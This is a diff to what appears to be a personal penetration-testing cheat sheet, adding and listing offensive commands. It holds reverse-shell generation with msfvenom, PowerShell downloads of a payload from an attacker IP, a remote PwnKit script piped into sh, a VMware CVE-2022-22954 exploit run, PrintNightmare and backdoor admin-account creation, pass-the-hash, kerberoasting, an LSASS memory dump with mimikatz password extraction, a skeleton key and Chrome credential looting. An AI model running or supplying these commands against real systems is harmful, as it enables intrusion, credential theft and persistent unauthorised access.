@@ -36,7 +36,6 @@ nc -nvlp 1337
 # HASHCAT (hashcat)
 Crack bcrypt hashes:
 hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt 
-
 # MSFVENOM (msfvenom, msf, metasploit)
 Generate reverse shell exe (bash):
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
@@ -59,12 +58,24 @@ Download reverse shell from source (cmd):
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/rev.exe' -OutFile 'c:\Windows\Temp\rev.exe'"
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/winPEAS.bat' -OutFile 'c:\Windows\Temp\lin.bat'"
 
+# POWERVIEW (powershell, powerview, ps)
+Download:
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+powershell-import /opt/PowerSploit-dev/Recon/PowerView.ps1
+Invoke-ShareFinder -CheckShareAccess
+
 net user NewUser MyPassword123! /add
 net localgroup Administrators /add NewUser
 
 # EVIL WinRM
 Pass the hash (bash):
 evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+# AD (ad, recon)
+net sessions
+net time
+net logons
+net share
 
 # John The Ripper (john, jtr, cracking hashes)
 Generate hash from files (bash):
@@ -84,6 +95,13 @@ Download: wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
 Run in bash:
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 
+# VMware Workspace One
+Source: https://github.com/DrorDvash/CVE-2022-22954_VMware_PoC
+
+wget https://raw.githubusercontent.com/DrorDvash/CVE-2022-22954_VMware_PoC/main/CVE-2022-22954.py
+python3 CVE-2022-22954.py example.com "cat /etc/passwd"
+
+wget https://raw.githubusercontent.com/DrorDvash/CVE-2022-22954_VMware_PoC/main/CVE-2022-22954.py
 From user to root (Privilege Escalation)
 find / -perm +6000 2> /dev/null
 
@@ -300,7 +318,11 @@ set RHOSTS 10.200.115.0/24
 set THREADS 5
 run -j
 
-# WINDOWS
+# OpenVAS (openvas, kali)
+sudo apt install gvm
+sudo gvm-check-setup
+
+# WINDOWS (windows)
 # printnightmare (PN, print, spool):
 Source: https://github.com/calebstewart/CVE-2021-1675.git
 Download: wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
@@ -309,11 +331,21 @@ In Powershell:
 Import-Module .\cve-2021-1675.ps1
 Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
 
+# Windows Exploit
+Download:
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
+shell systeminfo > win10-systeminfo.txt
+./windows-exploit-suggester.py --update
+./windows-exploit-suggester.py --database 2021-03-09-mssb.xls --systeminfo win10-systeminfo.txt
+
 # kerbrute (ad, brute force, pw)
 Quelle: https://github.com/ropnop/KERBRUTE
 Download: go get github.com/ropnop/kerbrute
 In Go binfolder:
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+
+# RUBEUS (rubeus)
+Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
 
 # Impacket (windows)
 Source: https://github.com/SecureAuthCorp/impacket
@@ -328,6 +360,22 @@ Download: wget https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c37
 In Powershell:
 Get-NetUser | select cn
 Get-NetGroup -GroupName *admin*
+
+If we have PRIVILEGED rights, with "hashdump" and "logonpasswords" we can get the hashes and the passwords. This is a fast way to get passwords, but it may not work. For example the AV will interfere.
+A better way to do it is this:
+	- Do ps and find the LSASS.exe process (It stores our passwords).Remember the PID.
+	- Make its dump.
+Go to beacon:
+	- cd Windows
+	- shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\User1\lsass.dmp full 
+	- In PID parameter specify PID number of LSASS.exe
+	- You can use any writeable directory, for example: C:\Users\User1\lsass.dmp
+Analogue of:
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpDump.exe
+When you make the dump, download it.
+Once downloaded, open mimikatz on your machine and run the following commands. (Put lsass.dmp in the folder with mimikatz)
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
 
 # MIMIKATZ
 In mimikatz:
@@ -362,6 +410,10 @@ misc::cmd
 Skeleton key (every User-PW: mimikatz):
 In mimikatz:
 misc::skeleton
+
+# LOOTING (loot, chrome)
+https://github.com/djhohnstein/SharpChromium
+SharpChrome.exe logins /showall
 
 # XSS (xss)
 html
